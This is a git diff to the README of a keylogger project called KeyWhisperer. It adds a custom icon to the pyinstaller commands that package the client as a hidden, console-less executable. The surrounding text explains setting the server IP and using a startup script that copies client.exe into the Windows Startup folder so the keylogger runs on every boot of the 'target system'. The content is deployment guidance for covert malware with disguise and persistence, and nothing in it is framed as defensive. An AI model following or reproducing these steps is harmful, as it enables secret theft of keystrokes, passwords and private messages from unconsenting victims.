@@ -56,7 +56,7 @@ The [client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/clien
 
 Change the Server IP Address and run the following command to convert your [client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/client.py) into a standalone executable:
 ```
-pyinstaller --onefile --noconsole client.py
+pyinstaller --onefile --noconsole --icon=icon.ico client.py
 ```
 <br>
 
@@ -65,7 +65,7 @@ In order to ensure that the keylogger runs automatically every time the target s
 
 Run the following command to convert your [startup script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/startup.py) into a standalone executable:
 ```
-pyinstaller --onefile --noconsole startup.py
+pyinstaller --onefile --noconsole --icon=icon.ico startup.py
 ```
 
 This will copy the client.exe file to any derired location which can be edited in the [startup script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/startup.py) and create a shortcut to the client.exe file in the Windows Startup folder, ensuring that the keylogger runs every time the system starts.
